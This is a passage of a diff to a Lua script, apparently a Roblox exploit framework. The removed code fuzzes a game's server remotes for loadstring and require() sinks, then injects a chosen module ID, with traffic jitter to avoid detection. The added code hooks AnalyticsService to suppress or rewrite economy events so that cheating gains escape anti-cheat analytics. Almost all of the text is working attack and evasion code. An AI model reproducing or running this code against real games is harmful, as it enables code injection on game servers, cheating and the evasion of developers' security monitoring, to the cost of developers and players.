@@ -1,3750 +1,906 @@
--- ── Imports ───────────────────────────────────────────────────────────────────
-local _C = _G.PC
+local PC              = _G.PC
+local GSE_Log         = PC.GSE_Log
+local GSE_LogCallbacks= PC.GSE_LogCallbacks
+local GSE_PERSIST_KEY = PC.GSE_PERSIST_KEY
+local TAG_COLORS      = PC.TAG_COLORS
+local C               = PC.C
+local gseBtn          = PC.gseBtn
+local gseLabel        = PC.gseLabel
+local gseInput        = PC.gseInput
+local gseRow          = PC.gseRow
+local gseHScroll      = PC.gseHScroll
+local gseChip         = PC.gseChip
+local pageGSE         = PC.pageGSE
+local mk              = PC.mk
+local addCorner       = PC.addCorner
+local addStroke       = PC.addStroke
+local hookHover       = PC.hookHover
+local tween           = PC.tween
+local makeSection     = PC.makeSection
+local clickSound      = PC.clickSound
+local pulseClick      = PC.pulseClick
+local DSE_Serialise = PC.DSE_Serialise
 
 -- ============================================================
--- ASE — Autonomous Strategy Engine
--- Layer 8 of the PaperCuts intelligence stack.
+-- ANALYTICS SERVICE EDIT (ASE)
+-- ============================================================
+-- AnalyticsService is the developer's telemetry layer.
+-- Games call it to annotate significant events for their
+-- own dashboards. For GSE the value is:
 --
--- ASE is the only TELEOLOGICAL layer — goal-directed, not
--- knowledge-directed. Every layer below it answers "what is
--- true?" ASE answers "what should I do to achieve X?"
+--   OBSERVATION:  Hook all Fire* methods to build a live
+--                 economy ledger and event map — the developer
+--                 annotated their own game for us.
 --
--- It operates in three execution modes:
+--   MANIPULATION: Intercept and modify calls before they fire.
+--                 Two modes:
+--                   PASSTHROUGH — log but don't alter
+--                   MODIFY      — rewrite specific fields
+--                   SUPPRESS    — silently drop the call
 --
---   COMPILED  — Semantic Directive Interface. ASE compiles
---               user intent into a validated data envelope,
---               routes through TSR, respects all safety gates.
+--   CLOAKING:     Suppress or modify economy events that
+--                 would trip anti-cheat analytics sensors
+--                 on large gain/sink amounts.
 --
---   RAW       — Protocol Forge. User constructs envelopes
---               manually (Lua table or byte-string). ASE
---               delivers and observes. No semantic guardrails.
---
---   MASTERY   — JIT Compiler for Exploits. Both tiers live
---               simultaneously. ASE autonomously decompiles
---               failed Compiled directives back into Raw,
---               re-fuzzes, re-binds, and lifts the fix back
---               up without user intervention. Gated by the
---               "I am responsible for my actions" handshake.
---
--- Four native goal types:
---   GOAL_BEDROCK   — establish A→B topological pipeline
---   GOAL_FINALIZE  — lift confirmed Raw sequence → TSR Intent
---   GOAL_RECOMPILE — autonomous drift recovery
---   GOAL_DISCOVER  — SBI/APE fuzzing campaign (feeds all three)
---
--- Modules:
---   1  GOAL ENGINE         manage goal queue + status
---   2  BEDROCK HANDSHAKE   nonce listener, A→B verification
---   3  DIRECTIVE COMPILER  intent → data envelope (Compiled)
---   4  FORGE ENGINE        raw payload builder + delivery
---   5  RECOMPILE ENGINE    drift detection → re-fuzz → re-bind
---   6  RISK BUDGET         per-session risk accounting
---   7  EXECUTION PANEL CTL panel visibility + mode state
+-- Four hooked methods:
+--   FireCustomEvent(player, eventCategory, customFields?)
+--   FireLogEvent(player, logLevel, message)
+--   FireEconomyEvent(player, itemSku, currencyType, amount,
+--                    flowType, transactionType, fields?)
+--   FireProgressionEvent(player, status, step1, step2?, step3?)
 -- ============================================================
 
-local ASE = {}
-
--- ── Configuration ─────────────────────────────────────────────
-local ASE_CFG = {
-    -- Nonce entropy (chars)
-    NonceLength         = 24,
-    -- How long to listen for nonce return (seconds)
-    NonceListenTimeout  = 8.0,
-    -- Max concurrent goals
-    MaxConcurrentGoals  = 4,
-    -- Risk budget per session (0–1, consumed by operations)
-    SessionRiskBudget   = 1.0,
-    -- Risk cost per operation type
-    RiskCost = {
-        BEDROCK        = 0.25,
-        VERIFY         = 0.08,
-        FINALIZE       = 0.10,
-        RECOMPILE      = 0.15,
-        DISCOVER       = 0.05,
-        RAW_FIRE       = 0.08,
-        -- Semantic ACE probe goals
-        ASSET_PROBE    = 0.06,
-        EVAL_PROBE     = 0.06,
-        DIFF_PROBE     = 0.04,
-        SEMANTIC_SWEEP = 0.15,
-    },
-    -- Drift threshold: SBI conf drop > this triggers RECOMPILE
-    DriftThreshold      = 0.12,
-    -- Recompile: max re-fuzz probes before giving up
-    RecompileMaxProbes  = 16,
-    -- Heartbeat interval (seconds)
-    HeartbeatInterval   = 3.0,
-    -- Persist
-    PersistKey          = "ASE_State_" .. tostring(game.PlaceId),
-    PersistVer          = "v1",
+local ASE = {
+    -- Raw event log: { time, method, args, modified, suppressed }
+    Events           = {},
+    -- Economy ledger: [itemSku] = { sku, currency, totalSource,
+    --                               totalSink, count, lastSeen }
+    Ledger           = {},
+    -- Suppression rules: [index] = { method, field, pattern }
+    SuppressionRules = {},
+    -- Modification rules: [index] = { method, field, pattern,
+    --                                  replacement }
+    ModRules         = {},
+    -- Master hook mode: "PASSTHROUGH" | "MODIFY" | "SUPPRESS_ALL"
+    HookMode         = "PASSTHROUGH",
+    -- Economy gain threshold for auto-cloaking (0 = disabled)
+    CloakThreshold   = 0,
+    -- Whether the hook is currently installed
+    HookInstalled    = false,
 }
 
--- ── Goal constants ─────────────────────────────────────────────
-ASE.GOAL   = { BEDROCK="BEDROCK", FINALIZE="FINALIZE",
-               RECOMPILE="RECOMPILE", DISCOVER="DISCOVER",
-               VERIFY="VERIFY",
-               -- Semantic ACE probe goals
-               ASSET_PROBE    = "ASSET_PROBE",    -- yield latency probe (require() hunt)
-               EVAL_PROBE     = "EVAL_PROBE",      -- identity expression echo (loadstring hunt)
-               DIFF_PROBE     = "DIFF_PROBE",      -- SR differential watch (state mutation hunt)
-               SEMANTIC_SWEEP = "SEMANTIC_SWEEP",  -- run all three on every candidate
-             }
-ASE.STATUS = { PENDING="PENDING", RUNNING="RUNNING",
-               COMPLETE="COMPLETE", FAILED="FAILED", ABORTED="ABORTED" }
-ASE.MODE   = { COMPILED="COMPILED", RAW="RAW", MASTERY="MASTERY" }
-
--- ── Internal state ─────────────────────────────────────────────
-local ASE_Goals        = {}     -- [id] = GoalRecord
-local ASE_GoalIDSeq    = 0
-local ASE_Mode         = ASE.MODE.COMPILED
-local ASE_MasteryUnlocked = false
-local ASE_RiskConsumed = 0.0
-local ASE_Running      = false
-local ASE_ActiveCount  = 0
-
--- Bedrock state
-local ASE_BedrockPairs = {}     -- [sinkRemote] = {feedbackRemote, nonce, confirmedAt}
-local ASE_NonceListeners = {}   -- [nonce] = {resolve fn, timeout t}
-
--- Execution Panel state (consumed by ase_ui.lua)
-ASE.Panel = {
-    Visible        = false,
-    Mode           = ASE.MODE.COMPILED,
-    ActiveSink     = nil,   -- confirmed Control Plane remote
-    ActiveFeedback = nil,   -- confirmed Feedback Plane remote
-    BedrockConf    = 0.0,
-    TxBuffer       = {},    -- [{t, directive, rawPayload, result, nonce}]
-    HeartbeatAlive = false,
-    ForgeExpanded  = false,
-    MasteryUnlocked= false,
-}
-
--- Directive registry (Finalized raw→compiled lifts)
-local ASE_Directives = {}
-
--- Per-remote linger dedup: prevents multiple VERIFY goals for same remote
-local ASE_LingerPending = {}  -- [remoteName] = true while VERIFY in flight
-
--- Per-remote discover cooldown: [remoteName] = os.clock() of last push
--- Prevents the AVD hook from re-queuing the same remote every report tick
-local ASE_DiscoverCooldown = {}
-local ASE_DISCOVER_COOLDOWN_S = 45  -- seconds between DISCOVER goals per remote  -- [name] = {name, category, envelope, sinkRemote, confirmedAt}
-
--- ── Utility ───────────────────────────────────────────────────
-local function ASE_NextID()
-    ASE_GoalIDSeq = ASE_GoalIDSeq + 1
-    return ASE_GoalIDSeq
-end
-
-local function ASE_GenNonce()
-    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-    local t = {}
-    for i = 1, ASE_CFG.NonceLength do
-        local r = math.random(1, #chars)
-        t[i] = chars:sub(r,r)
-    end
-    return table.concat(t)
-end
-
-local function ASE_ConsumeRisk(goalType)
-    local cost = ASE_CFG.RiskCost[goalType] or 0.05
-    ASE_RiskConsumed = ASE_RiskConsumed + cost
-    return ASE_RiskConsumed <= ASE_CFG.SessionRiskBudget
-end
-
-local function ASE_AppendTx(entry)
-    entry.t = os.clock()
-    table.insert(ASE.Panel.TxBuffer, 1, entry)
-    if #ASE.Panel.TxBuffer > 64 then
-        ASE.Panel.TxBuffer[65] = nil
-    end
-end
-
--- ═════════════════════════════════════════════════════════════
--- MODULE 1 — GOAL ENGINE
--- ═════════════════════════════════════════════════════════════
--- ═══════════════════════════════════════════════════════════════
--- SEMANTIC PROBE ENGINE
--- Three probe strategies wired through SR.DifferentialWatch
--- and reporting back to SBI via SBI.OnAssetProbe etc.
--- ═══════════════════════════════════════════════════════════════
-local ASE_SemanticProbes = {}
-
--- Helper: resolve a remote instance from name
-local function ASE_GetRemoteInst(name)
-    local PR = _G.PC.PR_Registry
-    return PR and PR[name] and PR[name].Remote or nil
-end
-
--- Helper: fire a remote with a timeout, return ok, result, latency
-local function ASE_TimedFire(inst, args, timeout)
-    timeout = timeout or 3.0
-    if not inst then return false, "no_instance", 0 end
-    local t0   = os.clock()
-    local done, ok, res = false, false, nil
-    task.spawn(function()
-        local callOk, callRes = pcall(function()
-            if inst:IsA("RemoteFunction") then
-                return inst:InvokeServer(table.unpack(args))
-            else
-                inst:FireServer(table.unpack(args))
-            end
-        end)
-        if not done then ok = callOk; res = callRes end
-        done = true
+-- Persist inside the shared GSE key
+local function ASE_Save()
+    pcall(function()
+        local saved = _G[GSE_PERSIST_KEY] or {}
+        saved.ASE_HookMode       = ASE.HookMode
+        saved.ASE_CloakThreshold = ASE.CloakThreshold
+        saved.ASE_SupRules       = ASE.SuppressionRules
+        saved.ASE_ModRules       = ASE.ModRules
+        _G[GSE_PERSIST_KEY]      = saved
     end)
-    while not done and (os.clock() - t0) < timeout do task.wait(0.05) end
-    done = true
-    return ok, ok and res or tostring(res), os.clock() - t0
 end
 
--- ── STRATEGY 1: Asset Loader Probe ────────────────────────────
--- Fires the remote with a known harmless asset ID and a baseline
--- non-asset arg. Measures latency divergence.
--- If yield latency >> baseline → server is fetching from CDN →
--- EXECUTION_CANDIDATE.
-local ASSET_PROBE_IDS = {
-    1281234852,   -- ProfileService (well-known public module)
-    3606536339,   -- DataStore2
-    4474981950,   -- Knit
-    9223372036,   -- nonexistent but valid range ID
-}
-local BASELINE_ARGS = { 0, -1, "probe" }
-
-function ASE_SemanticProbes.RunAssetProbe(goal)
-    local remoteName = goal.params and goal.params.remoteName
-    if not remoteName then return end
-    local inst = ASE_GetRemoteInst(remoteName)
-    if not inst then return end
-
-    local SBI = _G.PC.SBI
-
-    -- Baseline: fire with non-asset args, measure latency
-    for _, arg in ipairs(BASELINE_ARGS) do
-        local ok, res, lat = ASE_TimedFire(inst, {arg}, 2.0)
-        if SBI then SBI.OnAssetProbe(remoteName, lat, false) end
-        task.wait(0.3)
-    end
-
-    -- Asset probes: fire with each candidate asset ID
-    for _, assetId in ipairs(ASSET_PROBE_IDS) do
-        local ok, res, lat = ASE_TimedFire(inst, {assetId}, 4.0)
-        if SBI then SBI.OnAssetProbe(remoteName, lat, true) end
-        -- Log to output
-        local rec = SBI and SBI.Get(remoteName)
-        if rec and rec.YieldDivergence >= 80 then
-            print(string.format("[ASE][ASSET_PROBE] %s: divergence=%.0fms → EXECUTION_CANDIDATE",
-                remoteName, rec.YieldDivergence))
-        end
-        task.wait(0.5)
-    end
+local function ASE_Load()
+    pcall(function()
+        local s = _G[GSE_PERSIST_KEY]
+        if type(s) ~= "table" then return end
+        if type(s.ASE_HookMode)       == "string" then ASE.HookMode       = s.ASE_HookMode       end
+        if type(s.ASE_CloakThreshold) == "number" then ASE.CloakThreshold = s.ASE_CloakThreshold end
+        if type(s.ASE_SupRules)       == "table"  then ASE.SuppressionRules = s.ASE_SupRules     end
+        if type(s.ASE_ModRules)       == "table"  then ASE.ModRules       = s.ASE_ModRules       end
+    end)
 end
 
--- ── STRATEGY 2: Evaluator Probe (loadstring / Lua-in-Lua VM) ──
--- Sends identity expressions as string arguments.
--- If the server echoes back the computed result → loadstring surface.
-local EVAL_EXPRESSIONS = {
-    "return 42",
-    "return 1+1",
-    "return 2*3",
-    "return tostring(42)",
-    "print(42)",          -- no return but may log
-    "[[return 42]]",      -- long string variant
-}
+ASE_Load()
 
-function ASE_SemanticProbes.RunEvalProbe(goal)
-    local remoteName = goal.params and goal.params.remoteName
-    if not remoteName then return end
-    local inst = ASE_GetRemoteInst(remoteName)
-    if not inst then return end
+-- ── Event log helpers ─────────────────────────────────────────
+local ASE_EventCallbacks = {}
+local ASE_LedgerCallbacks = {}
 
-    local SBI = _G.PC.SBI
-
-    for _, expr in ipairs(EVAL_EXPRESSIONS) do
-        local ok, res, lat = ASE_TimedFire(inst, {expr}, 2.5)
-        if SBI then SBI.OnEvaluatorProbe(remoteName, expr, ok and res or nil) end
-        local rec = SBI and SBI.Get(remoteName)
-        if rec and (rec.LoadstringSignals or 0) >= 1 then
-            print(string.format("[ASE][EVAL_PROBE] %s: echo confirmed → EXECUTION_CANDIDATE",
-                remoteName))
-        end
-        task.wait(0.4)
-    end
-end
-
--- ── STRATEGY 3: Differential SR Watch (State Mutation) ────────
--- Uses SR.DifferentialWatch to detect any state change the server
--- makes when this remote fires — including changes only visible
--- to other clients (replication).
--- Fires with +1 delta on numeric args, or a crafted small table.
-function ASE_SemanticProbes.RunDiffProbe(goal)
-    local remoteName = goal.params and goal.params.remoteName
-    if not remoteName then return end
-    local inst = ASE_GetRemoteInst(remoteName)
-    if not inst then return end
-
-    local SR  = _G.PC.SR
-    local SBI = _G.PC.SBI
-    if not SR then return end
-
-    -- Probe args: try common small mutations
-    local DIFF_ARGS = {
-        {1},
-        {1, 1},
-        {"buy", 1},
-        {"add", 1},
-        {true},
-        {},
+local function ASE_LogEvent(method, args, modified, suppressed)
+    local entry = {
+        time       = os.clock(),
+        method     = method,
+        args       = args,
+        modified   = modified   or false,
+        suppressed = suppressed or false,
     }
-
-    for _, args in ipairs(DIFF_ARGS) do
-        local result = SR.DifferentialWatch(function()
-            pcall(function()
-                if inst:IsA("RemoteFunction") then
-                    inst:InvokeServer(table.unpack(args))
-                else
-                    inst:FireServer(table.unpack(args))
-                end
-            end)
-        end, 1.5, nil)   -- watch ALL domains, 1.5s window
-
-        if SBI then SBI.OnDifferentialProbe(remoteName, result) end
-
-        if result.anyChange then
-            print(string.format(
-                "[ASE][DIFF_PROBE] %s: %d state changes detected, dominated=%s",
-                remoteName, #result.changes, result.dominated))
-            for _, ch in ipairs(result.changes) do
-                print(string.format("  [%s.%s] %s → %s (Δ%s)",
-                    ch.domain, ch.varName,
-                    tostring(ch.prevValue), tostring(ch.newValue),
-                    tostring(ch.delta)))
-            end
-        end
-        task.wait(0.6)
-    end
+    table.insert(ASE.Events, 1, entry)
+    if #ASE.Events > 200 then table.remove(ASE.Events) end
+    local tag = suppressed and "SUPPRESS" or (modified and "MODIFY" or "OBSERVE")
+    GSE_Log("ASE", "[" .. tag .. "] " .. method .. "  " ..
+            (args[2] and tostring(args[2]):sub(1,40) or ""))
+    for _, cb in ipairs(ASE_EventCallbacks) do pcall(cb, entry) end
 end
 
--- ── Full Semantic Sweep: runs all 3 strategies on one remote ──
-function ASE_SemanticProbes.RunSweep(goal)
-    local remoteName = goal.params and goal.params.remoteName
-    if not remoteName then return end
+-- ── Economy ledger update ─────────────────────────────────────
+local function ASE_UpdateLedger(sku, currency, amount, flowType)
+    sku      = tostring(sku      or "unknown")
+    currency = tostring(currency or "unknown")
+    amount   = tonumber(amount)  or 0
 
-    print(string.format("[ASE][SWEEP] Starting semantic sweep on %s", remoteName))
-
-    -- Run all three in sequence
-    pcall(ASE_SemanticProbes.RunAssetProbe,  { params={ remoteName=remoteName } })
-    pcall(ASE_SemanticProbes.RunEvalProbe,   { params={ remoteName=remoteName } })
-    pcall(ASE_SemanticProbes.RunDiffProbe,   { params={ remoteName=remoteName } })
-
-    -- Final classification
-    local SBI = _G.PC.SBI
-    local rec = SBI and SBI.Get(remoteName)
-    if rec then
-        print(string.format("[ASE][SWEEP] %s → ServerLogic=%s conf=%.2f",
-            remoteName, rec.ServerLogic, rec.Confidence))
-    end
-end
-
--- Public: kick off a sweep on all PR_Registry remotes above a priority threshold
--- ═══════════════════════════════════════════════════════════════
--- SBI CHAIN DETECTOR — Internal Chain Observer
--- Detects Remote→Bindable trust hand-offs by watching for
--- "ghost deltas": state changes in paths NOT in the remote's
--- known RSM BehaviorSig.AffectedPaths.
---
--- Uses SR.DifferentialWatch as the observation engine.
--- Reports ghost deltas to SBI.OnChainProbe.
--- ═══════════════════════════════════════════════════════════════
-local SBI_ChainDetector = {}
-
--- Build the set of paths RSM already knows this remote affects
-local function Chain_GetKnownPaths(remoteName)
-    local RSM = _G.PC.RSM
-    local rec = RSM and RSM.Get(remoteName)
-    if not rec then return {} end
-    local known = {}
-    for path in pairs(rec.BehaviorSig.AffectedPaths or {}) do
-        known[path] = true
-    end
-    for path in pairs(rec.BehaviorSig.PathDeltas or {}) do
-        known[path] = true
-    end
-    return known
-end
-
--- Filter diff results to only changes in paths NOT in known set
--- These are "ghost deltas" — evidence of internal chain propagation
-local function Chain_FilterGhosts(changes, knownPaths)
-    local ghosts = {}
-    for _, ch in ipairs(changes) do
-        local pathKey = (ch.domain or "") .. "." .. (ch.varName or "")
-        -- Ghost = not in known RSM paths AND not pure noise
-        local isKnown = false
-        for kp in pairs(knownPaths) do
-            if kp:lower():find((ch.varName or ""):lower(), 1, true) then
-                isKnown = true; break
-            end
-        end
-        if not isKnown and ch.confidence > 0.15 then
-            table.insert(ghosts, ch)
-        end
-    end
-    return ghosts
-end
-
--- Resolve remote instance
-local function Chain_GetInst(remoteName)
-    local PR = _G.PC.PR_Registry
-    return PR and PR[remoteName] and PR[remoteName].Remote or nil
-end
-
--- ── Core: ObserveChain ─────────────────────────────────────────
--- Fires the remote with testPayload, watches for 250ms,
--- returns ghost deltas and chain latency.
-function SBI_ChainDetector.ObserveChain(remoteName, testPayload, windowSecs)
-    windowSecs = windowSecs or 0.30
-    local inst = Chain_GetInst(remoteName)
-    if not inst then
-        return { detected=false, reason="no_instance" }
+    if not ASE.Ledger[sku] then
+        ASE.Ledger[sku] = {
+            sku         = sku,
+            currency    = currency,
+            totalSource = 0,
+            totalSink   = 0,
+            count       = 0,
+            lastSeen    = 0,
+        }
     end
 
-    local SR  = _G.PC.SR
-    local SBI = _G.PC.SBI
-    if not SR then
-        return { detected=false, reason="SR_not_loaded" }
-    end
+    local rec = ASE.Ledger[sku]
+    rec.count    = rec.count + 1
+    rec.lastSeen = os.clock()
+    rec.currency = currency
 
-    local knownPaths = Chain_GetKnownPaths(remoteName)
-    local fireT      = os.clock()
-
-    -- DifferentialWatch: captures all changes in the window
-    local result = SR.DifferentialWatch(function()
-        pcall(function()
-            if inst:IsA("RemoteFunction") then
-                inst:InvokeServer(table.unpack(testPayload))
-            else
-                inst:FireServer(table.unpack(testPayload))
-            end
-        end)
-    end, windowSecs, nil)
-
-    -- Filter to ghost deltas only
-    local ghosts = Chain_FilterGhosts(result.changes, knownPaths)
-
-    -- Compute chain latency (first ghost delta time relative to fire)
-    local chainLatencyMs = nil
-    if #ghosts > 0 and #result.rawEvents > 0 then
-        local firstT = result.rawEvents[1].t
-        chainLatencyMs = (firstT - fireT) * 1000
-    end
-
-    -- Report to SBI
-    if SBI then
-        SBI.OnChainProbe(remoteName, ghosts, chainLatencyMs, nil)
-    end
-
-    local detected = #ghosts > 0
-
-    if detected then
-        print(string.format(
-            "[SBI_CHAIN] %s — %d ghost delta(s) detected, latency=%.0fms, dominated=%s",
-            remoteName, #ghosts,
-            chainLatencyMs or 0, result.dominated))
-        for _, g in ipairs(ghosts) do
-            print(string.format("  ghost: [%s.%s] %s→%s",
-                g.domain, g.varName,
-                tostring(g.prevValue), tostring(g.newValue)))
-        end
-    end
-
-    return {
-        detected       = detected,
-        ghosts         = ghosts,
-        chainLatencyMs = chainLatencyMs,
-        dominated      = result.dominated,
-        allChanges     = result.changes,
-        reason         = detected and "ghost_deltas_found" or "no_ghost_deltas",
-    }
-end
-
--- ── Echo Probe ────────────────────────────────────────────────
--- Sends a unique tag string as a payload argument.
--- After firing, scans the SR model for any variable whose
--- VALUE contains or matches the tag — evidence the server
--- stored our input somewhere internally (Bindable log,
--- DataStore staging, admin queue, etc.)
---
--- Returns {found, foundPaths[], tag}
-function SBI_ChainDetector.EchoProbe(remoteName, customTag)
-    local tag  = customTag or string.format("PC_PROBE_%d", math.random(1000, 9999))
-    local inst = Chain_GetInst(remoteName)
-    if not inst then return { found=false, tag=tag, foundPaths={} } end
-
-    local SR  = _G.PC.SR
-    local SBI = _G.PC.SBI
-    if not SR then return { found=false, tag=tag, foundPaths={} } end
-
-    print(string.format("[SBI_CHAIN][ECHO] %s  tag=%s", remoteName, tag))
-
-    -- Fire with tag as sole string argument
-    local result = SR.DifferentialWatch(function()
-        pcall(function()
-            if inst:IsA("RemoteFunction") then
-                inst:InvokeServer(tag)
-            else
-                inst:FireServer(tag)
-            end
-        end)
-    end, 0.30, nil)
-
-    -- Scan all changed SR vars for the tag value
-    local foundPaths = {}
-    for _, ch in ipairs(result.changes) do
-        local val = tostring(ch.newValue or "")
-        if val:find(tag, 1, true) then
-            table.insert(foundPaths, {
-                domain  = ch.domain,
-                varName = ch.varName,
-                value   = val,
-            })
-        end
-    end
-
-    -- Also scan entire SR model (tag may have landed in a non-changed var
-    -- if SR already held that slot and just confirmed the value)
-    local allVars = SR.GetAll(0.05)
-    for _, sv in ipairs(allVars) do
-        if tostring(sv.value or ""):find(tag, 1, true) then
-            local alreadyFound = false
-            for _, fp in ipairs(foundPaths) do
-                if fp.varName == sv.name then alreadyFound=true; break end
-            end
-            if not alreadyFound then
-                table.insert(foundPaths, {
-                    domain  = sv.domain,
-                    varName = sv.name,
-                    value   = tostring(sv.value),
-                })
-            end
-        end
-    end
-
-    local found = #foundPaths > 0
-
-    if found then
-        print(string.format("[!!!][ECHO] Tag '%s' found in %d path(s):", tag, #foundPaths))
-        for _, fp in ipairs(foundPaths) do
-            print(string.format("  [%s.%s] = %s", fp.domain, fp.varName, fp.value))
-        end
-    end
-
-    -- Report echo result to SBI
-    if SBI then
-        SBI.OnChainProbe(remoteName, {}, nil, {
-            tag        = tag,
-            foundPaths = foundPaths,
-        })
-    end
-
-    return { found=found, tag=tag, foundPaths=foundPaths }
-end
-
--- ── Full Chain Sweep ──────────────────────────────────────────
--- Runs ObserveChain + EchoProbe on a list of remotes.
--- Returns all confirmed chain candidates sorted by ghost count.
-function SBI_ChainDetector.SweepAll(remoteNames, opts)
-    opts = opts or {}
-    local windowSecs = opts.windowSecs or 0.30
-    local payloads   = opts.payloads   or { {"probe"}, {0}, {1}, {"admin"}, {true} }
-    local results    = {}
-
-    for _, name in ipairs(remoteNames) do
-        local best = { detected=false, ghosts={} }
-
-        -- Try multiple payloads — different handlers may respond to different types
-        for _, payload in ipairs(payloads) do
-            local obs = SBI_ChainDetector.ObserveChain(name, payload, windowSecs)
-            if obs.detected and #obs.ghosts > #best.ghosts then
-                best = obs
-                best.triggerPayload = payload
-            end
-            task.wait(0.15)
-        end
-
-        -- Always run echo probe (independent of chain result)
-        local echo = SBI_ChainDetector.EchoProbe(name)
-
-        if best.detected or echo.found then
-            table.insert(results, {
-                remote         = name,
-                chainResult    = best,
-                echoResult     = echo,
-                ghostCount     = #best.ghosts,
-                echoFound      = echo.found,
-                triggerPayload = best.triggerPayload,
-            })
-        end
-
-        task.wait(0.4 + math.random() * 0.3)
-    end
-
-    table.sort(results, function(a, b)
-        -- Sort: echo found first, then by ghost count
-        if a.echoFound ~= b.echoFound then return a.echoFound end
-        return a.ghostCount > b.ghostCount
-    end)
-
-    print(string.format("[SBI_CHAIN] Sweep complete — %d/%d remotes show internal chains",
-        #results, #remoteNames))
-
-    return results
-end
-
--- Export
-_G.PC.SBI_Chain = SBI_ChainDetector
-
--- Public shortcut on ASE
-function ASE.ChainSweep(remoteNames, opts)
-    -- If no list given, use all C2S remotes from PR_Registry
-    if not remoteNames then
-        local PR = _G.PC.PR_Registry
-        remoteNames = {}
-        if PR then
-            for name, rec in pairs(PR) do
-                if rec.Direction ~= "S2C" then
-                    table.insert(remoteNames, name)
-                end
-            end
-        end
-    end
-    print(string.format("[ASE] ChainSweep: %d remotes queued", #remoteNames))
-    return task.spawn(function()
-        SBI_ChainDetector.SweepAll(remoteNames, opts)
-    end)
-end
-
--- ═══════════════════════════════════════════════════════════════
--- ASE DIRECTIVE: INJECTION HUNT
--- Two-stage Credential Fuzzing pipeline.
---
--- Stage 1 SAFE PROBE:  fire a known public asset ID, measure yield
---                      latency.  >80ms = CDN fetch = require() sink.
--- Stage 2 INJECT:      fire the Sovereign module ID into confirmed
---                      sinks.  SR.DifferentialWatch captures all
---                      downstream state changes.
---
--- Works for ASSET_SINK, EVAL_SINK, and REPLICATION_SINK targets.
--- Uses the existing Bedrock 150ms heartbeat jitter profile so
--- injection traffic is indistinguishable from normal game traffic.
--- ═══════════════════════════════════════════════════════════════
-local ASE_InjectionHunt = {}
-
--- Safe probe IDs — well-known public Roblox modules
--- These are used in Stage 1 to establish whether the remote
--- actually calls require() before we send our own payload.
-local SAFE_PROBE_IDS = {
-    507307032,   -- standard Roblox mesh (non-module, fast reject)
-    1281234852,  -- ProfileService (well-known, will yield on CDN fetch)
-    3606536339,  -- DataStore2
-}
-
--- Jitter range to stay inside Bedrock's 150ms window
-local JITTER_MIN = 0.08
-local JITTER_MAX = 0.15
-
-local function Hunt_Jitter()
-    task.wait(JITTER_MIN + math.random() * (JITTER_MAX - JITTER_MIN))
-end
-
--- Resolve a remote instance by name
-local function Hunt_GetInst(remoteName)
-    local PR = _G.PC.PR_Registry
-    return PR and PR[remoteName] and PR[remoteName].Remote or nil
-end
-
--- Timed fire with hard timeout (reuses ASE_SemanticProbes helper logic)
-local function Hunt_TimedFire(inst, args, timeout)
-    timeout = timeout or 3.5
-    if not inst then return false, nil, 0 end
-    local t0, done, ok, res = os.clock(), false, false, nil
-    task.spawn(function()
-        local callOk, callRes = pcall(function()
-            if inst:IsA("RemoteFunction") then
-                return inst:InvokeServer(table.unpack(args))
-            else
-                inst:FireServer(table.unpack(args))
-            end
-        end)
-        if not done then ok = callOk; res = callRes end
-        done = true
-    end)
-    while not done and (os.clock() - t0) < timeout do task.wait(0.05) end
-    done = true
-    return ok, ok and res or tostring(res), os.clock() - t0
-end
-
--- ── Stage 1: Safe Probe ────────────────────────────────────────
--- Returns yieldMs (latency when sending a real asset ID) vs
--- baselineMs (latency for a dummy arg).
--- If yieldMs - baselineMs >= 80ms → confirmed CDN fetch → require() sink.
-function ASE_InjectionHunt.SafeProbe(remoteName)
-    local inst = Hunt_GetInst(remoteName)
-    if not inst then
-        return { confirmed=false, reason="no_instance" }
-    end
-
-    -- Baseline: dummy arg (not an asset ID — should return immediately)
-    local _, _, baselineMs = Hunt_TimedFire(inst, {0}, 2.0)
-    baselineMs = baselineMs * 1000
-    Hunt_Jitter()
-
-    -- Asset probe: send known public module IDs
-    local yieldMs   = baselineMs
-    local probeOk   = false
-    local probeResp = nil
-
-    for _, safeId in ipairs(SAFE_PROBE_IDS) do
-        local ok, res, lat = Hunt_TimedFire(inst, {safeId}, 4.0)
-        local latMs = lat * 1000
-        if latMs > yieldMs then yieldMs = latMs end
-        if ok then probeOk = true; probeResp = res end
-        Hunt_Jitter()
-    end
-
-    local divergence = yieldMs - baselineMs
-    local confirmed  = divergence >= 80
-
-    -- Report to SBI
-    local SBI = _G.PC.SBI
-    if SBI then
-        SBI.OnAssetProbe(remoteName, yieldMs / 1000, true)
-        SBI.OnAssetProbe(remoteName, baselineMs / 1000, false)
-    end
-
-    print(string.format("[HUNT][SAFE_PROBE] %s  baseline=%.0fms  yield=%.0fms  divergence=%.0fms  confirmed=%s",
-        remoteName, baselineMs, yieldMs, divergence, tostring(confirmed)))
-
-    return {
-        confirmed   = confirmed,
-        divergence  = divergence,
-        baselineMs  = baselineMs,
-        yieldMs     = yieldMs,
-        probeResp   = probeResp,
-        reason      = confirmed and "yield_divergence" or "no_divergence",
-    }
-end
-
--- ── Stage 2: Sovereign Injection ─────────────────────────────
--- Fires the target module ID into the confirmed sink.
--- SR.DifferentialWatch captures every downstream state change.
--- Returns the full watch result plus SBI classification.
-function ASE_InjectionHunt.Inject(remoteName, moduleId, extraArgs)
-    local inst = Hunt_GetInst(remoteName)
-    if not inst then
-        return { success=false, reason="no_instance" }
-    end
-
-    local SR  = _G.PC.SR
-    local SBI = _G.PC.SBI
-    if not SR then
-        return { success=false, reason="SR_not_loaded" }
-    end
-
-    -- Build args: moduleId first, then any extra
-    local args = { moduleId }
-    if extraArgs then
-        for _, v in ipairs(extraArgs) do table.insert(args, v) end
-    end
-
-    print(string.format("[HUNT][INJECT] %s  moduleId=%d", remoteName, moduleId))
-
-    -- Differential watch: 2.5s window to catch all downstream effects
-    local result = SR.DifferentialWatch(function()
-        Hunt_TimedFire(inst, args, 4.0)
-    end, 2.5, nil)
-
-    -- Report to SBI
-    if SBI then SBI.OnDifferentialProbe(remoteName, result) end
-
-    local sbiRec = SBI and SBI.Get(remoteName)
-
-    -- Print all state changes
-    if result.anyChange then
-        print(string.format("[HUNT][INJECT] %s → %d state changes (dominated=%s)",
-            remoteName, #result.changes, result.dominated))
-        for _, ch in ipairs(result.changes) do
-            print(string.format("  Δ [%s.%s]  %s → %s",
-                ch.domain, ch.varName,
-                tostring(ch.prevValue), tostring(ch.newValue)))
-        end
+    -- flowType is Enum.AnalyticsEconomyFlowType
+    -- .Source = player gained, .Sink = player spent
+    local ftStr = tostring(flowType):lower()
+    if ftStr:find("source") then
